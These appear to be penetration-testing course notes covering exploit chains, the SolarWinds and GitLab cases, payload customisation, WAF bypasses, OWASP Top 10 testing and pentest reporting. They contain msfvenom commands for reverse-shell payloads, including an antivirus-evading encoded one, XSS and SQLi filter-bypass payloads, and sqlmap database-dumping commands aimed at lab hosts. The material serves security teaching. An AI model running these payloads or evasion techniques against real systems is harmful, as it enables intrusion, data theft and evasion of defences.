# 📖 Week 3 — Theoretical Knowledge Notes

---

## 1. Advanced Vulnerability Exploitation

### 1.1 Exploit Chains

An **exploit chain** is a sequence of multiple vulnerabilities combined to achieve a higher-impact attack than any single vulnerability alone. Each stage leverages the access or data gained from the previous step.

**Why Chain Exploits?**
- Individual vulnerabilities may have low severity ratings
- Chaining elevates impact dramatically — e.g., a Medium XSS + Low CSRF = Critical credential theft
- Reflects real-world attacker behaviour — rarely is a single flaw sufficient for full compromise

**Classic Chain Example — XSS → Session Hijacking → RCE:**

```
Stage 1: Identify Reflected XSS in search field
           ↓
Stage 2: Craft payload to steal admin session cookie
           ↓
Stage 3: Hijack admin session → access admin panel
           ↓
Stage 4: Upload malicious file via admin panel
           ↓
Stage 5: Execute uploaded file → RCE on server
```

**Real-World Case — SolarWinds Supply Chain Attack (2020):**

The SolarWinds attack is one of the most sophisticated exploit chains ever documented. Attackers:
1. Compromised the SolarWinds software build pipeline (supply chain)
2. Injected malicious code (SUNBURST backdoor) into legitimate Orion software updates
3. Updates were digitally signed by SolarWinds — bypassing trust controls
4. 18,000+ organisations installed the backdoored update
5. Attackers moved laterally inside victim networks for months undetected
6. Final stage: data exfiltration from government agencies and Fortune 500 companies

**Key Lesson:** The attack succeeded because it chained: trusted vendor access → code injection → signed update delivery → lateral movement → exfiltration. No single stage alone would have achieved the impact.

**Another Example — CVE-2021-22205 (GitLab RCE Chain):**
1. Unauthenticated file upload accepted by GitLab's image processing (ExifTool)
2. Malicious image contained crafted metadata with embedded shell commands
3. ExifTool parsed the metadata and executed the embedded command
4. Result: Remote Code Execution as the `git` user — no authentication required

**CVSS:** 10.0 Critical — because the chain required zero interaction and zero authentication.

---

### 1.2 Exploit Customization

Raw Exploit-DB PoCs are often written for a **specific version** of a target and may not work directly. Customisation is essential.

**Common Customisation Requirements:**

| Modification | Reason | Example |
|-------------|--------|---------|
| Change target IP/port | PoC hardcodes a default | Replace `127.0.0.1` with `192.168.56.104` |
| Adjust offset values | Buffer overflows are binary-specific | Recalculate EIP offset for target binary |
| Replace shellcode | Default shellcode may be detected | Generate new shellcode with `msfvenom` |
| Fix Python 2 → Python 3 | Many old PoCs use `print` without parentheses | `print "x"` → `print("x")` |
| Add proxy support | Testing through Burp Suite | Add `proxies={'http':'http://127.0.0.1:8080'}` |
| Encode payload | WAF bypass | Base64 encode, URL encode, or use hex |

**msfvenom — Custom Payload Generation:**
```bash
# Generate a custom reverse shell payload
msfvenom -p linux/x86/meterpreter/reverse_tcp \
  LHOST=192.168.56.101 \
  LPORT=4444 \
  -f python \
  -o custom_payload.py

# Windows payload
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=192.168.56.101 \
  LPORT=4444 \
  -f exe \
  -o payload.exe

# Encode to bypass basic AV
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=192.168.56.101 LPORT=4444 \
  -e x86/shikata_ga_nai -i 3 \
  -f exe -o encoded_payload.exe
```

---

### 1.3 Obfuscation Techniques

Obfuscation hides the true nature of an attack from security controls (WAFs, IDS, AV).

**WAF Bypass Techniques for SQLi:**

| Technique | Example | Explanation |
|-----------|---------|-------------|
| Case variation | `SeLeCt` | WAF rules often case-sensitive |
| Comment insertion | `SE/**/LECT` | SQL ignores `/**/` comments |
| URL encoding | `%27%20OR%20%271%27%3D%271` | Bypasses string matching |
| Double encoding | `%2527` | Some WAFs decode once; server decodes twice |
| Whitespace substitution | `SELECT%09username` | Tab instead of space |

**WAF Bypass for XSS:**
```javascript
// Basic blocked
<script>alert(1)</script>

// Bypass using event handlers
<img src=x onerror=alert(1)>

// Bypass using encoding
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>

// Bypass using SVG
<svg onload=alert(1)>

// Bypass using template literals
<script>alert`1`</script>

// Case and tag mixing
<ScRiPt>alert(1)</sCrIpT>
```

**Polymorphic Payloads:** Change structure each run to avoid signature matching. Metasploit's `shikata_ga_nai` encoder is a classic example — it encrypts shellcode differently on each generation.

---

## 2. Web Application Penetration Testing

### 2.1 OWASP Top 10 (2021) — Key Vulnerabilities

The OWASP Top 10 is the definitive list of the most critical web application security risks:

| Rank | Category | Description | Example |
|------|----------|-------------|---------|
| A01 | Broken Access Control | Users act outside their intended permissions | Accessing `/admin` without being admin |
| A02 | Cryptographic Failures | Sensitive data exposed due to weak/missing encryption | Storing passwords in plaintext |
| A03 | Injection | Untrusted data sent to an interpreter | SQL injection, command injection |
| A04 | Insecure Design | Missing security controls at design level | No rate limiting on login page |
| A05 | Security Misconfiguration | Default configs, unnecessary features enabled | Default credentials, directory listing |
| A06 | Vulnerable Components | Outdated libraries with known CVEs | Apache 2.2.8, jQuery 1.x |
| A07 | Auth & Identification Failures | Broken authentication allows account compromise | Brute-forcing weak passwords |
| A08 | Software & Data Integrity | Untrusted deserialization, CI/CD pipeline attacks | SolarWinds-type supply chain |
| A09 | Logging & Monitoring Failures | Attacks not detected due to insufficient logging | No alerts on 1000 failed logins |
| A10 | SSRF | Server makes requests to unintended locations | `?url=http://169.254.169.254/metadata` |

---

### 2.2 Testing Techniques

**Burp Suite — Core Workflow:**

1. **Proxy:** Intercept all browser traffic
2. **Repeater:** Manually modify and replay individual requests
3. **Intruder:** Automated fuzzing (brute-force, payload injection)
4. **Scanner:** Automated vulnerability detection (Pro version)
5. **Decoder:** Encode/decode Base64, URL, HTML, Hex

**Session Token Manipulation with Burp:**
```
1. Login as low-privilege user → capture request in Burp Proxy
2. Send to Repeater
3. Modify session cookie or user ID parameter
4. Try accessing admin endpoints
5. If access granted → Broken Access Control (IDOR)
```

**sqlmap Testing Workflow:**
```bash
# Step 1 — Detect injection points
sqlmap -u "http://target/page?id=1" --batch

# Step 2 — Enumerate databases
sqlmap -u "http://target/page?id=1" --dbs --batch

# Step 3 — Enumerate tables
sqlmap -u "http://target/page?id=1" -D dbname --tables --batch

# Step 4 — Dump table
sqlmap -u "http://target/page?id=1" -D dbname -T tablename --dump --batch

# For authenticated pages — always include cookie
sqlmap -u "http://target/page?id=1" \
  --cookie="PHPSESSID=REAL_VALUE; security=low" \
  --batch
```

**OWASP ZAP — Automated Scanning:**
```bash
# Launch ZAP
zaproxy &

# CLI spider + active scan
zap-cli quick-scan --self-contained \
  --start-options "-config api.disablekey=true" \
  http://192.168.56.104/dvwa
```

---

### 2.3 Secure Coding Mitigations

| Vulnerability | Mitigation | Code Example |
|---------------|-----------|--------------|
| SQL Injection | Prepared statements | `$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?"); $stmt->execute([$id]);` |
| XSS | Output encoding | `htmlspecialchars($input, ENT_QUOTES, 'UTF-8')` |
| CSRF | CSRF tokens | Include unique token in every state-changing form |
| Broken Auth | bcrypt hashing | `password_hash($password, PASSWORD_BCRYPT)` |
| Sensitive Data | Encryption at rest | AES-256 for stored data; TLS 1.3 in transit |
| Insecure Design | Rate limiting | Max 5 login attempts per minute per IP |

---

## 3. Reporting and Stakeholder Communication

### 3.1 Report Structure (PTES Standard)

A professional pentest report must contain:

| Section | Audience | Content |
|---------|----------|---------|
| **Executive Summary** | Management/Board | Business risk, overall posture, top 3 findings |
| **Scope & Methodology** | All | What was tested, how, when |
| **Technical Findings** | Security team/Developers | Detailed vulnerability writeups with PoC |
| **Risk Ratings** | Management + Technical | CVSS scores, business impact |
| **Remediation Plan** | Developers/IT | Specific, actionable fixes per finding |
| **Appendix** | Technical team | Raw tool output, evidence, references |

**Each Technical Finding Should Include:**
```
Finding Title:     SQL Injection in Login Form
Severity:          Critical (CVSS 9.1)
Affected Asset:    http://192.168.56.104/dvwa/vulnerabilities/sqli/
Description:       The id parameter is vulnerable to SQL injection...
Proof of Concept:  sqlmap -u "..." --dbs
Impact:            Full database compromise, credential theft
Remediation:       Use prepared statements for all database queries
References:        CWE-89, OWASP A03:2021
```

---


